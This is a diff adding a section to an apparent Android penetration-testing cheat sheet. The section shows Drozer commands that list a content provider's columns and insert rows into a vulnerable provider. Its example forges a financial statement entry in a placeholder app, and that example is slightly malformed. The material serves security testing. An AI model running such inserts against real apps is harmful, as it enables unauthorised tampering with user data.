@@ -927,6 +927,29 @@ DBContentProvider/Keys/
 
 ```
 
+### inserting Data into vulnerable content providers
+```
+Getting the colums of content provider
+--------------------------------------
+ dz> run app.provider.columns [URI]
+
+
+
+
+Inserting Data
+--------------
+dz> run app.provider.insert [URI] [--boolean [name] [value]] [--integer
+[name] [value]] [--string [name] [value]]...
+
+
+Example:
+--------
+dz> run app.provider.insert –-int _id 12 –-int from_account 31337
+–-int to_account –-int amount 31337 content://com.example.
+vulnerabledatabase.contentprovider/statements 
+
+
+```
 
 ### Directory Traversal in Content Providers
 ```
